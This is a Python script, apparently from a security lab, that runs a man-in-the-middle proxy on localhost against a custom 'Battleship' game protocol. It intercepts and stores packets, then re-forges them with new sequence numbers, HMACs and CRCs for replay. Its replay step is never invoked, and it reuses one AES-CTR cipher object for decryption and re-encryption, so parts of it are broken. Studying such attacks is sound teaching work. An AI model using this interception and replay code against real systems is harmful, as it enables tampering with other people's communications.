# Updated man-in-the-middle proxy for Battleship protocol

import socket
import threading
import time
import logging
import struct
import binascii
from Crypto.Cipher import AES
from Crypto.Hash import HMAC, SHA256

from protocol import send_message, receive_message

# Configuration
CLIENT_LISTEN = ('127.0.0.1', 8000)  # Proxy listens here; client connects here
SERVER_TARGET = ('127.0.0.1', 5001)  # Proxy connects to real server here

# Add logging configuration
logging.basicConfig(level=logging.DEBUG, format='[%(levelname)s] %(message)s')
logger = logging.getLogger("attacker")

# Encryption keys and parameters (placeholders, replace with actual values)
KEY = b'Sixteen byte key'
NONCE = b'UniqueNonce'
IV0 = b'InitializationVe'

class ReplayAttacker:
    def __init__(self):
        self.stored_packets = []  # Store intercepted packets for replay

    def intercept_and_forward(self, client_sock, server_sock):
        """Intercept packets from client, forward to server, and store them."""
        while True:
            try:
                packet = receive_message(client_sock)
                if not packet:
                    logger.info("[ATTACKER] No more packets from client. Closing connection.")
                    break

                # Store the packet for replay
                self.stored_packets.append(packet)
                logger.debug(f"[ATTACKER] Intercepted and stored packet: {packet}")

                # Forward the packet to the server
                send_message(server_sock, packet)
                logger.debug(f"[ATTACKER] Forwarded packet to server: {packet}")

            except Exception as e:
                logger.error(f"[ATTACKER] Error intercepting: {e}")
                break

    def intercept_and_forward_to_client(self, server_sock, client_sock):
        """Intercept packets from server, forward to client."""
        while True:
            try:
                packet = receive_message(server_sock)
                if not packet:
                    logger.info("[ATTACKER] No more packets from server. Closing connection.")
                    break

                # Forward the packet to the client
                send_message(client_sock, packet)
                logger.debug(f"[ATTACKER] Forwarded packet to client: {packet}")

            except Exception as e:
                logger.error(f"[ATTACKER] Error intercepting from server: {e}")
                break

    def replay_packets(self, server_sock):
        """Replay stored packets to the server with modified sequence numbers."""
        logger.info("[ATTACKER] Replaying stored packets...")
        for i, packet in enumerate(self.stored_packets):
            try:
                # Modify the packet to make it appear unique (e.g., change sequence number)
                modified_packet = self.modify_packet(packet, i)
                send_message(server_sock, modified_packet)
                logger.debug(f"[ATTACKER] Replayed modified packet: {modified_packet}")
                time.sleep(1)  # Add delay between replays if needed
            except Exception as e:
                logger.error(f"[ATTACKER] Error replaying packet: {e}")

    def modify_packet(self, packet, new_seq):
        """Modify the packet to change its sequence number and recalculate HMAC and CRC."""
        # Decrypt the packet to access its fields
        cipher = AES.new(KEY, AES.MODE_CTR, nonce=NONCE, initial_value=IV0)
        plaintext = cipher.decrypt(packet)

        # Extract fields from the plaintext
        seq = struct.unpack(">I", plaintext[:4])[0]
        payload = plaintext[4:-42]  # Exclude TS(8), HMAC(32), CRC(2)
        ts_bytes = plaintext[-42:-34]

        # Update the sequence number
        new_seq_bytes = struct.pack(">I", new_seq)
        data_to_mac = new_seq_bytes + payload + ts_bytes

        # Recalculate HMAC
        h = HMAC.new(KEY, digestmod=SHA256)
        h.update(data_to_mac)
        new_mac = h.digest()

        # Recalculate CRC
        new_plaintext = data_to_mac + new_mac
        new_crc = binascii.crc_hqx(new_plaintext, 0).to_bytes(2, 'big')

        # Assemble the modified packet
        modified_plaintext = new_plaintext + new_crc
        modified_packet = cipher.encrypt(modified_plaintext)

        return modified_packet

    def run(self):
        """Run the attacker as a man-in-the-middle proxy."""
        try:
            # Initialize variables to avoid referencing before assignment
            client_sock = None
            server_sock = None

            # Listen for client connection
            client_listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client_listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  # Allow address reuse
            client_listener.bind(CLIENT_LISTEN)
            client_listener.listen(1)
            logger.info(f"[ATTACKER] Listening for client on {CLIENT_LISTEN}")

            client_sock, _ = client_listener.accept()
            logger.info("[ATTACKER] Client connected.")

            # Connect to the real server
            server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server_sock.connect(SERVER_TARGET)
            logger.info(f"[ATTACKER] Connected to server at {SERVER_TARGET}")

            # Start intercepting and forwarding in separate threads
            client_to_server_thread = threading.Thread(target=self.intercept_and_forward, args=(client_sock, server_sock))
            server_to_client_thread = threading.Thread(target=self.intercept_and_forward_to_client, args=(server_sock, client_sock))

            client_to_server_thread.start()
            server_to_client_thread.start()

            # Wait for threads to finish
            client_to_server_thread.join()
            server_to_client_thread.join()

        except Exception as e:
            logger.error(f"[ATTACKER] Error in run method: {e}")
        finally:
            # Clean up
            try:
                if client_sock:
                    client_sock.close()
                if server_sock:
                    server_sock.close()
                client_listener.close()
                logger.info("[ATTACKER] Cleaned up resources.")
            except Exception as e:
                logger.error(f"[ATTACKER] Error during cleanup: {e}")

if __name__ == "__main__":
    attacker = ReplayAttacker()
    attacker.run()